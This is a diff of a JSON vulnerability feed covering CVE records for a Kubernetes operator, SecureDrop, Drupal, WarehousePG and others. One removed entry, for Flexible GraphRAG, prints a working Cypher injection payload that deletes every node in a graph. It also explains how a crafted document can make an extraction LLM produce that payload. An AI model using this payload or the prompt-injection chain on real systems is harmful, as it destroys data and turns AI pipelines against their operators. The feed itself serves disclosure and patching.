+      "epss": null,
+      "epss_percentile": null,
+      "x_mentions": null,
+      "sources": [
+        "cve.org",
+        "nvd"
+      ],
+      "category": "vuln",
+      "resolved_at": "",
+      "first_seen": "2026-10-30T22:58:56.692254+00:00",
+      "matched": [
+        "kubernetes"
+      ],
+      "match_type": "keyword",
+      "tier": 2,
+      "score": 31.6,
+      "level": "medium",
+      "score_breakdown": {
+        "popularity": 14.0,
+        "cvss": 12.6,
+        "unauth_network": 5
+      },
+      "ai_analysis": ""
+    },
+    {
       "id": "CVE-2026-110215",
       "aliases": [],
       "title": "",
@@ -59781,6 +60472,55 @@
         "popularity": 14.0,
         "cvss": 12.2,
         "unauth_network": 5
+      },
+      "ai_analysis": ""
+    },
+    {
+      "id": "CVE-2026-62284",
+      "aliases": [],
+      "title": "OSAC operator: Kubeconfig credential-plugin execution and SSRF in console proxy",
+      "description": "OSAC operator is a Kubernetes operator. In the affected revision identified as 8220502, the `console-proxy` `RemoteConfigResolver` parses Kubernetes Secret kubeconfig data with `clientcmd.RESTConfigFromKubeConfig` without sanitizing the resulting `rest.Config`. An attacker who can create or modify a Secret labeled `osac.openshift.io/remote-cluster-kubeconfig`: \"true\" in a namespace where the proxy's RoleBinding grants Secret read access can supply `users[].user.exec`. When `rest.TransportFor` builds the HTTP transport for an upstream WebSocket connection, client-go invokes that exec credential plugin, spawning an arbitrary process as the osac-`console-proxy` service account inside the pod. Attacker-controlled `clusters[].server` also enables server-side request forgery from the proxy pod. Remote and auto VM cluster modes are affected, with auto the default; exclusively `local` mode does not read kubeconfig Secrets and is unaffected. The credential-plugin execution path is patched in commit 7e4222b; that patch does not address the described server-address SSRF path.",
+      "published": "2026-10-30T19:23:39.257Z",
+      "updated": "2026-10-30T22:15:16.751Z",
+      "cvss": 8.6,
+      "cvss_vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:H/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N",
+      "severity": "high",
+      "cpes": [],
+      "packages": [],
+      "vendor_products": [
+        "osac-project osac-operator"
+      ],
+      "references": [
+        "https://github.com/osac-project/osac-operator/security/advisories/GHSA-5w5g-j6hw-6p8f",
+        "https://github.com/osac-project/osac-operator/pull/321",
+        "https://github.com/osac-project/osac-operator/commit/7e4222b6ab465fc00606c8cfed980b226820cb1b",
+        "https://github.com/osac-project/osac-operator/commit/86466378aa3603253dca7fa2f59a2733af0dc092"
+      ],
+      "exploit_ref": false,
+      "kev": false,
+      "kev_date_added": "",
+      "ransomware": false,
+      "ssvc_exploitation": "none",
+      "epss": null,
+      "epss_percentile": null,
+      "x_mentions": null,
+      "sources": [
+        "cve.org",
+        "nvd"
+      ],
+      "category": "vuln",
+      "resolved_at": "",
+      "first_seen": "2026-10-30T22:58:56.692254+00:00",
+      "matched": [
+        "kubernetes"
+      ],
+      "match_type": "keyword",
+      "tier": 2,
+      "score": 31.2,
+      "level": "medium",
+      "score_breakdown": {
+        "popularity": 14.0,
+        "cvss": 17.2
       },
       "ai_analysis": ""
     },
@@ -61783,7 +62523,7 @@
       "title": "",
       "description": "Authorization Bypass Through User-Controlled Key (CWE-639) in the cart and wishlist repositories of MarcosCamara01 Ecommerce Template allows any authenticated user to delete and modify the cart and wishlist rows of any other user, because cartRepository.delete(), cartRepository.updateQuantityInternal() and wishlistRepository.delete() in src/lib/db/drizzle/repositories/ match rows by primary key alone, with no predicate on the owning user, and the per user authorization for those three operations rests on PostgreSQL row level security. The migrations run ALTER TABLE ... ENABLE ROW LEVEL SECURITY and create policies comparing app.current_user_id() with user_id, but never ALTER TABLE ... FORCE ROW LEVEL SECURITY, and PostgreSQL does not apply policies to the role that owns a table. The template uses one DATABASE_URL both to run the migrations, which create the tables, and for the application at runtime, so the application connects as the owner of the tables and the policies do not apply to it. cart_items.id and wishlist.id are sequential bigserial values, so the identifiers of rows belonging to other users can be enumerated, and the update path returns the modified row, which carries the identifier of the user it belongs to. This results in the destruction and modification of cart and wishlist contents belonging to other accounts of the installation.",
       "published": "2026-10-22T16:17:35.183",
-      "updated": "2026-10-26T12:17:04.640",
+      "updated": "2026-10-30T19:18:12.443",
       "cvss": 7.1,
       "cvss_vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:L/VI:H/VA:N/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X",
       "severity": "high",
@@ -61800,7 +62540,7 @@
       "ransomware": false,
       "ssvc_exploitation": "",
       "epss": 0.00249,
-      "epss_percentile": 0.1613,
+      "epss_percentile": 0.16331,
       "x_mentions": null,
       "sources": [
         "nvd"
@@ -64110,52 +64850,6 @@
       "ai_analysis": ""
     },
     {
-      "id": "CVE-2026-108097",
-      "aliases": [],
-      "title": "Drupal core - Critical - Remote code execution - SA-CORE-2026-014",
-      "description": "Use of Externally-Controlled Input to Select Classes or Code ('Unsafe Reflection') vulnerability in Drupal Drupal core allows Reflection Injection. This issue affects Drupal core versions: from 8.9.0 to 10.6.19, from 11.0.0 to 11.3.19, from 11.4.0 to 11.4.10, from 12.0.0-alpha1 to 12.0.0-beta2.",
-      "published": "2026-10-30T03:09:55.043Z",
-      "updated": "2026-10-30T04:18:04.130",
-      "cvss": null,
-      "cvss_vector": "",
-      "severity": "",
-      "cpes": [],
-      "packages": [],
-      "vendor_products": [
-        "Drupal Drupal core"
-      ],
-      "references": [
-        "https://www.drupal.org/sa-core-2026-014"
-      ],
-      "exploit_ref": false,
-      "kev": false,
-      "kev_date_added": "",
-      "ransomware": false,
-      "ssvc_exploitation": "",
-      "epss": null,
-      "epss_percentile": null,
-      "x_mentions": null,
-      "sources": [
-        "cve.org",
-        "nvd"
-      ],
-      "category": "vuln",
-      "resolved_at": "",
-      "first_seen": "2026-10-30T06:29:46.175004+00:00",
-      "matched": [
-        "drupal"
-      ],
-      "match_type": "exact",
-      "tier": 2,
-      "score": 25,
-      "level": "low",
-      "score_breakdown": {
-        "popularity": 20,
-        "rce": 5
-      },
-      "ai_analysis": ""
-    },
-    {
       "id": "CVE-2026-108099",
       "aliases": [],
       "title": "Entity  List - Critical - Remote code execution - SA-CONTRIB-2026-218",
@@ -64432,6 +65126,50 @@
       "ai_analysis": ""
     },
     {
+      "id": "CVE-2026-104947",
+      "aliases": [],
+      "title": "",
+      "description": "WarehousePG (WHPG) 7.2.1 through 7.6.0 is affected by a missing authorization vulnerability (CWE-862) in the built-in function gp_log_backend_memory_contexts(). Any authenticated database role can run this function without a GRANT. It also gets around the superuser restriction that PostgreSQL places on the underlying pg_log_backend_memory_contexts() function. A low-privileged user can force the segment backends of any other session, superuser sessions included, to write their memory context details to the segment server logs, which the attacker cannot read. Those details can include query text from other users' cached plans, and the call can be repeated to generate large amounts of log output. WarehousePG 6.x is not affected.",
+      "published": "2026-10-21T14:17:08.927",
+      "updated": "2026-10-30T19:17:58.333",
+      "cvss": 5.3,
+      "cvss_vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X",
+      "severity": "medium",
+      "cpes": [],
+      "packages": [],
+      "vendor_products": [],
+      "references": [
+        "https://www.enterprisedb.com/docs/security/advisories/cve2026104947/"
+      ],
+      "exploit_ref": false,
+      "kev": false,
+      "kev_date_added": "",
+      "ransomware": false,
+      "ssvc_exploitation": "",
+      "epss": 0.00216,
+      "epss_percentile": 0.12099,
+      "x_mentions": null,
+      "sources": [
+        "nvd"
+      ],
+      "category": "vuln",
+      "resolved_at": "",
+      "first_seen": "2026-10-30T22:58:56.692254+00:00",
+      "matched": [
+        "postgresql"
+      ],
+      "match_type": "keyword",
+      "tier": 2,
+      "score": 24.6,
+      "level": "low",
+      "score_breakdown": {
+        "popularity": 14.0,
+        "cvss": 10.6,
+        "epss": 0.0
+      },
+      "ai_analysis": ""
+    },
+    {
       "id": "CVE-2026-116181",
       "aliases": [],
       "title": "",
@@ -64528,33 +65266,30 @@
     {
       "id": "CVE-2026-50000",
       "aliases": [],
-      "title": "SecureDrop: API session token reuse against the Journalist Interface web UI",
+      "title": "",
       "description": "SecureDrop is an open-source whistleblower submission system that media organizations can use to securely accept documents from, and communicate with anonymous sources. From 2.5.0 until 2.16.0, the `Journalist Interface` can accept an `API session` token against the `web UI` because its `SessionInterface` keeps a mutable session key prefix that changes with each request and persists across requests. API and web sessions were separated in `Redis` starting in version 2.5.0, but prefix corruption confuses those session namespaces. An attacker who already has access to the secret `Journalist Interface` onion address, the required authentication access and a recent nonexpired `API session` token can reuse that token against the `web UI` until its natural expiry, at most eight hours. The corrupted prefix can also prevent logout from deleting the correct `Redis` session, although normal expiry still applies. A compromised journalist can access encrypted submissions and perform broad actions on source submissions, but this issue does not expose plaintext submissions or affect the running system's availability. This issue is fixed in version 2.16.0.",
-      "published": "2026-10-30T17:11:13.250Z",
-      "updated": "2026-10-30T18:35:34.990Z",
-      "cvss": 5,
+      "published": "2026-10-30T17:17:25.373",
+      "updated": "2026-10-30T19:37:07.073",
+      "cvss": 5.0,
       "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:U/C:L/I:H/A:N",
       "severity": "medium",
       "cpes": [],
       "packages": [],
-      "vendor_products": [
-        "freedomofpress securedrop"
-      ],
+      "vendor_products": [],
       "references": [
-        "https://github.com/freedomofpress/securedrop/security/advisories/GHSA-78xq-8jf3-gpfx",
         "https://github.com/freedomofpress/securedrop/commit/cbe60cd68b67f44ffdd44c364c71cc71b40acfb5",
-        "https://github.com/freedomofpress/securedrop/releases/tag/2.16.0"
+        "https://github.com/freedomofpress/securedrop/releases/tag/2.16.0",
+        "https://github.com/freedomofpress/securedrop/security/advisories/GHSA-78xq-8jf3-gpfx"
       ],
       "exploit_ref": false,
       "kev": false,
       "kev_date_added": "",
       "ransomware": false,
-      "ssvc_exploitation": "none",
+      "ssvc_exploitation": "",
       "epss": null,
       "epss_percentile": null,
       "x_mentions": null,
       "sources": [
-        "cve.org",
         "nvd"
       ],
       "category": "vuln",
@@ -64569,7 +65304,7 @@
       "level": "low",
       "score_breakdown": {
         "popularity": 14.0,
-        "cvss": 10
+        "cvss": 10.0
       },
       "ai_analysis": ""
     },
@@ -65556,39 +66291,32 @@
     },
     {
       "id": "CVE-2026-114510",
-      "aliases": [
-        "GHSA-vqrg-773h-4wxc"
-      ],
-      "title": "Flexible GraphRAG: Cypher/Graph Injection via broken string-escaping in FalkorDB adapter (_escape()) - full graph wipe from ingested-document content",
-      "description": "**Description**\ndef _escape(v: str) -> str:\n    return str(v).replace(\"'\", \"\\\\'\").replace(\"\\\\\", \"\\\\\\\\\")\nThe escaping order is backwards, exactly like the classic HTML double-escape bug: step 1 inserts a literal backslash in front of every ', then step 2 re-matches that just-inserted backslash and doubles it. For an input ending in a single quote, the two steps combined produce \\\\' (two backslashes followed by the quote) in the output — which, under the standard backslash-escape convention used by Cypher/openCypher single-quoted string literals, is parsed as one escaped backslash followed by an unescaped, string-terminating quote. The quote is not neutralized; the string breaks open.\n\nThis escaped value is interpolated directly into Cypher query strings built by string formatting (not parameters) at 5 call sites in the same method:\n\nself.lc_graph.query(\n    f\"MERGE (n:`{node.type}` {{id: '{_escape(node.id)}'}}) \"\n    f\"{props}\"\n    f\"RETURN distinct 'done' AS result\"\n)\n...\nself.lc_graph.query(\n    f\"MATCH (a:`{rel.source.type}` {{id: '{_escape(rel.source.id)}'}}), \"\n    f\"(b:`{rel.target.type}` {{id: '{_escape(rel.target.id)}'}}) \"\n    f\"MERGE (a)-[r:`{rel_type}`]->(b) \"\n    f\"{props}\"\n    f\"RETURN distinct 'done' AS result\"\n)\nnode.type, rel.source.type, rel.target.type and rel_type are also interpolated into backtick-quoted identifiers with no escaping at all.\n\nWhere the attacker-controlled data comes from: node/rel objects are LLM-extracted entities and relationships derived from ingested document content (the whole point of this GraphRAG pipeline). Document content is therefore untrusted input relative to this database layer — a classic indirect-prompt-injection-to-query-injection chain: craft a document whose text causes the extraction LLM to produce an entity id containing the payload below, ingest it, and the broken escape function turns it into live Cypher.\n\n**Impact**\nFull Cypher clause injection into lc_graph.query() calls that run with no query parameterization and no read-only restriction visible in this adapter. Demonstrated impact: appending a second clause (MATCH (m) DETACH DELETE m) to the query wipes every node and relationship in the graph in a single call. The same primitive can be adapted to exfiltrate data (e.g. RETURN other nodes' properties back through a field the caller reads) or tamper with existing records, depending on what the calling code surfaces to the end user/LLM.\n\nProof of Concept (executed, full query reconstruction)\nOnly the two-line _escape() function and the f-string template were executed — no import of the flexible-graphrag package itself.\n\nraw attacker-controlled node.id:\n\"pwn' }) MATCH (m) DETACH DELETE m RETURN count(m) AS pwn //\"\noutput of buggy _escape():\n\"pwn\\\\' }) MATCH (m) DETACH DELETE m RETURN count(m) AS pwn //\"\nfull query string actually sent to lc_graph.query():\nMERGE (n:`Entity` {id: 'pwn\\\\' }) MATCH (m) DETACH DELETE m RETURN count(m) AS pwn //'}) RETURN distinct 'done' AS result\nParse trace (standard backslash-escape convention for single-quoted Cypher strings):\n\nOpening ' starts the id string literal.\npwn is consumed literally.\n\\\\ (two backslash chars) is consumed as one escaped-backslash sequence — the string now holds one literal backslash.\nThe very next character is an unescaped ' — this closes the string literal early. id value ends up as \"pwn\\\" (with a trailing backslash).\nThe remaining text }) MATCH (m) DETACH DELETE m RETURN count(m) AS pwn //... is now parsed as live Cypher syntax, not string content.\n}) closes the property map and the node pattern — completing a valid MERGE clause.\nMATCH (m) DETACH DELETE m RETURN count(m) AS pwn is a second, fully valid Cypher clause chained immediately after the MERGE (Cypher allows sequential clauses with no separator).\n// starts a line comment, consuming the rest of the original template ('}) RETURN distinct 'done' AS result) so it never executes.\nEffective query the database actually receives:\n\nMERGE (n:`Entity` {id: 'pwn\\'}) MATCH (m) DETACH DELETE m RETURN count(m) AS pwn\n- a syntactically complete, two-clause Cypher statement that creates one throwaway node and then deletes the entire graph.\n\nSuggested Fix\nEscape \\ before ' (fixes the ordering bug, same class of fix as the litellm report):\ndef _escape(v: str) -> str:\n    return str(v).replace(\"\\\\\", \"\\\\\\\\\").replace(\"'\", \"\\\\'\")\nStronger fix, recommended in addition: use FalkorDB's parameterized query support (lc_graph.query(query, params={...})) instead of string interpolation entirely, and reject/escape backtick characters in node.type/rel_type/rel.source.type/rel.target.type before using them as label/relationship-type identifiers (these have no escaping at all today).\nOne caveat (same as original internal triage)\nThis was verified as a pure string-construction bug (steps 1-8 above are executed, not hypothesized) and confirmed against FalkorDB's Cypher-compatible documentation's stated backslash-escape convention for string literals, but was not run against a live FalkorDB instance to observe the parser's exact behavior byte-for-byte. If FalkorDB's dialect deviates from this convention, the specific PoC payload above may need minor adjustment — the underlying escape-ordering defect itself is confirmed either way.\n\nMaintainer note: confirmed exploitable against a live FalkorDB. FalkorDB requires a WITH\nbetween MERGE and MATCH, so the payload needs \"WITH 1 AS x\" added; with it, the payload\ndeleted every node in the graph. Fixed in 0.8.2: values are passed as query parameters and\nlabels/relationship types/property keys are stripped of backticks.\n\nAffected configuration: GRAPH_BACKEND=langchain with GRAPH_DB=falkordb only. The LlamaIndex\nFalkorDB store is not affected.\n\nWorkaround before upgrading: use GRAPH_BACKEND=llamaindex with FalkorDB, or another graph database.",
-      "published": "2026-10-27T15:32:45Z",
-      "updated": "2026-10-27T15:32:45Z",
+      "aliases": [],
+      "title": "",
+      "description": "Flexible GraphRAG is a Python framework for building graph and retrieval-augmented generation applications across multiple graph, vector, and search backends. From 0.6.0 until 0.8.2, the _escape() helper in flexible-graphrag/langchain/graph/pg_store_adapters/falkordb_adapter.py escapes quotes before backslashes and then interpolates the result into Cypher assembled by FalkorDBAdapter.add_graph_documents, allowing an inserted escape to be doubled and a quote to terminate the string early. When GRAPH_BACKEND=langchain and GRAPH_DB=falkordb are configured, attacker-influenced ingested document content can cause the extraction model to produce malicious entity or relationship values that reach these queries, allowing injected Cypher clauses to modify or delete graph data and, when the calling code surfaces query results to the user or LLM, disclose graph data. Dynamic node and relationship type identifiers are also inserted into backtick-quoted query positions without safe parameterization. The LlamaIndex FalkorDB store is not affected. This issue is fixed in version 0.8.2.",
+      "published": "2026-10-22T15:17:05.500",
+      "updated": "2026-10-30T20:17:00.030",
       "cvss": 7.1,
       "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:L/UI:R/S:U/C:H/I:H/A:H",
       "severity": "high",
       "cpes": [],
-      "packages": [
-        "pip:flexible-graphrag"
-      ],
+      "packages": [],
       "vendor_products": [],
       "references": [
-        "https://github.com/advisories/GHSA-vqrg-773h-4wxc",
-        "https://github.com/stevereiner/flexible-graphrag/security/advisories/GHSA-vqrg-773h-4wxc",
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-114510",
         "https://github.com/stevereiner/flexible-graphrag/commit/9ace8d47e198ce3f15dbf22853e396ab4e9884fa",
         "https://github.com/stevereiner/flexible-graphrag/releases/tag/v0.8.2",
-        "https://github.com/advisories/GHSA-vqrg-773h-4wxc"
+        "https://github.com/stevereiner/flexible-graphrag/security/advisories/GHSA-vqrg-773h-4wxc"
       ],
       "exploit_ref": false,
       "kev": false,
       "kev_date_added": "",
       "ransomware": false,
       "ssvc_exploitation": "",
-      "epss": 0.00241,
-      "epss_percentile": 0.15091,
+      "epss": 0.00365,
+      "epss_percentile": 0.30321,
       "x_mentions": null,
       "sources": [
-        "ghsa"
+        "nvd"
       ],
       "category": "vuln",
       "resolved_at": "",
@@ -65598,12 +66326,12 @@
       ],
       "match_type": "keyword",
       "tier": 3,
-      "score": 21.2,
+      "score": 21.3,
       "level": "low",
       "score_breakdown": {
         "popularity": 7.0,
         "cvss": 14.2,
-        "epss": 0.0
+        "epss": 0.1
       },
       "ai_analysis": ""
     },
@@ -95316,96 +96044,6 @@
       "ai_analysis": ""
     },
     {
-      "id": "CVE-2026-108514",
-      "aliases": [],
-      "title": "Drupal core - Moderately critical - Cross-site scripting - SA-CORE-2026-016",
-      "description": "Improper Neutralization of Input During Web Page Generation (\"Cross-site Scripting\") vulnerability in Drupal Drupal core allows Cross-Site Scripting (XSS). This issue affects Drupal core versions: from 10.3.0 to 10.6.19, from 11.0.0 to 11.3.19, from 11.4.0 to 11.4.10, from 12.0.0-alpha1 to 12.0.0-beta2.",
-      "published": "2026-10-30T03:09:51.346Z",
-      "updated": "2026-10-30T04:18:05.750",
-      "cvss": null,
-      "cvss_vector": "",
-      "severity": "",
-      "cpes": [],
-      "packages": [],
-      "vendor_products": [
-        "Drupal Drupal core"
-      ],
-      "references": [
-        "https://www.drupal.org/sa-core-2026-016"
-      ],
-      "exploit_ref": false,
-      "kev": false,
-      "kev_date_added": "",
-      "ransomware": false,
-      "ssvc_exploitation": "",
-      "epss": null,
-      "epss_percentile": null,
-      "x_mentions": null,
-      "sources": [
-        "cve.org",
-        "nvd"
-      ],
-      "category": "vuln",
-      "resolved_at": "",
-      "first_seen": "2026-10-30T06:29:46.175004+00:00",
-      "matched": [
-        "drupal"
-      ],
-      "match_type": "exact",
-      "tier": 2,
-      "score": 20,
-      "level": "low",
-      "score_breakdown": {
-        "popularity": 20
-      },
-      "ai_analysis": ""
-    },
-    {
-      "id": "CVE-2026-108515",
-      "aliases": [],
-      "title": "Drupal core - Moderately critical - Cross-site scripting - SA-CORE-2026-015",
-      "description": "Improper Neutralization of Input During Web Page Generation (\"Cross-site Scripting\") vulnerability in Drupal Drupal core allows Cross-Site Scripting (XSS). This issue affects Drupal core versions: from 8.9.0 to 10.6.19, from 11.0.0 to 11.3.19, from 11.4.0 to 11.4.10, from 12.0.0-alpha1 to 12.0.0-beta2.",
-      "published": "2026-10-30T03:09:52.573Z",
-      "updated": "2026-10-30T04:18:07.017",
-      "cvss": null,
-      "cvss_vector": "",
-      "severity": "",
-      "cpes": [],
-      "packages": [],
-      "vendor_products": [
-        "Drupal Drupal core"
-      ],
-      "references": [
-        "https://www.drupal.org/sa-core-2026-015"
-      ],
-      "exploit_ref": false,
-      "kev": false,
-      "kev_date_added": "",
-      "ransomware": false,
-      "ssvc_exploitation": "",
-      "epss": null,
-      "epss_percentile": null,
-      "x_mentions": null,
-      "sources": [
-        "cve.org",
-        "nvd"
-      ],
-      "category": "vuln",
-      "resolved_at": "",
-      "first_seen": "2026-10-30T06:29:46.175004+00:00",
-      "matched": [
-        "drupal"
-      ],
-      "match_type": "exact",
-      "tier": 2,
-      "score": 20,
-      "level": "low",
-      "score_breakdown": {
-        "popularity": 20
-      },
-      "ai_analysis": ""
-    },
-    {
       "id": "CVE-2026-110738",
       "aliases": [],
       "title": "Gin Admin Theme - Moderately critical - Cross-site scripting - SA-CONTRIB-2026-219",
@@ -98828,6 +99466,135 @@
       "score_breakdown": {
         "popularity": 14.0,
         "cvss": 3.6,
+        "epss": 0.0
+      },
+      "ai_analysis": ""
+    },
+    {
+      "id": "CVE-2026-108097",
+      "aliases": [],
+      "title": "",
+      "description": "Use of Externally-Controlled Input to Select Classes or Code ('Unsafe Reflection') vulnerability in Drupal Drupal core allows Reflection Injection. This issue affects Drupal core versions: from 8.9.0 to 10.6.19, from 11.0.0 to 11.3.19, from 11.4.0 to 11.4.10, from 12.0.0-alpha1 to 12.0.0-beta2.",
+      "published": "2026-10-30T04:18:04.130",
+      "updated": "2026-10-30T19:27:58.620",
+      "cvss": null,
+      "cvss_vector": "",
+      "severity": "",
+      "cpes": [],
+      "packages": [],
+      "vendor_products": [],
+      "references": [
+        "https://www.drupal.org/sa-core-2026-014"
+      ],
+      "exploit_ref": false,
+      "kev": false,
+      "kev_date_added": "",
+      "ransomware": false,
+      "ssvc_exploitation": "",
+      "epss": 0.00326,
+      "epss_percentile": 0.25716,
+      "x_mentions": null,
+      "sources": [
+        "nvd"
+      ],
+      "category": "vuln",
+      "resolved_at": "",
+      "first_seen": "2026-10-30T06:29:46.175004+00:00",
+      "matched": [
+        "drupal"
+      ],
+      "match_type": "keyword",
+      "tier": 2,
+      "score": 14.0,
+      "level": "low",
+      "score_breakdown": {
+        "popularity": 14.0,
+        "epss": 0.0
+      },
+      "ai_analysis": ""
+    },
+    {
+      "id": "CVE-2026-108514",
+      "aliases": [],
+      "title": "",
+      "description": "Improper Neutralization of Input During Web Page Generation (\"Cross-site Scripting\") vulnerability in Drupal Drupal core allows Cross-Site Scripting (XSS). This issue affects Drupal core versions: from 10.3.0 to 10.6.19, from 11.0.0 to 11.3.19, from 11.4.0 to 11.4.10, from 12.0.0-alpha1 to 12.0.0-beta2.",
+      "published": "2026-10-30T04:18:05.750",
+      "updated": "2026-10-30T19:27:58.620",
+      "cvss": null,
+      "cvss_vector": "",
+      "severity": "",
+      "cpes": [],
+      "packages": [],
+      "vendor_products": [],
+      "references": [
+        "https://www.drupal.org/sa-core-2026-016"
+      ],
+      "exploit_ref": false,
+      "kev": false,
+      "kev_date_added": "",
+      "ransomware": false,
+      "ssvc_exploitation": "",
+      "epss": 0.00197,
+      "epss_percentile": 0.09468,
+      "x_mentions": null,
+      "sources": [
+        "nvd"
+      ],
+      "category": "vuln",
+      "resolved_at": "",
+      "first_seen": "2026-10-30T06:29:46.175004+00:00",
+      "matched": [
+        "drupal"
+      ],
+      "match_type": "keyword",
+      "tier": 2,
+      "score": 14.0,
+      "level": "low",
+      "score_breakdown": {
+        "popularity": 14.0,
+        "epss": 0.0
+      },
+      "ai_analysis": ""
+    },
+    {
+      "id": "CVE-2026-108515",
+      "aliases": [],
+      "title": "",
+      "description": "Improper Neutralization of Input During Web Page Generation (\"Cross-site Scripting\") vulnerability in Drupal Drupal core allows Cross-Site Scripting (XSS). This issue affects Drupal core versions: from 8.9.0 to 10.6.19, from 11.0.0 to 11.3.19, from 11.4.0 to 11.4.10, from 12.0.0-alpha1 to 12.0.0-beta2.",
+      "published": "2026-10-30T04:18:07.017",
+      "updated": "2026-10-30T19:27:58.620",
+      "cvss": null,
+      "cvss_vector": "",
+      "severity": "",
+      "cpes": [],
+      "packages": [],
+      "vendor_products": [],
+      "references": [
+        "https://www.drupal.org/sa-core-2026-015"
+      ],
+      "exploit_ref": false,
+      "kev": false,
+      "kev_date_added": "",
+      "ransomware": false,
+      "ssvc_exploitation": "",
+      "epss": 0.00197,
+      "epss_percentile": 0.09468,
+      "x_mentions": null,
+      "sources": [
+        "nvd"
+      ],
+      "category": "vuln",
+      "resolved_at": "",
+      "first_seen": "2026-10-30T06:29:46.175004+00:00",
+      "matched": [
+        "drupal"
+      ],
+      "match_type": "keyword",
+      "tier": 2,
+      "score": 14.0,
+      "level": "low",
+      "score_breakdown": {
+        "popularity": 14.0,
         "epss": 0.0
       },
       "ai_analysis": ""
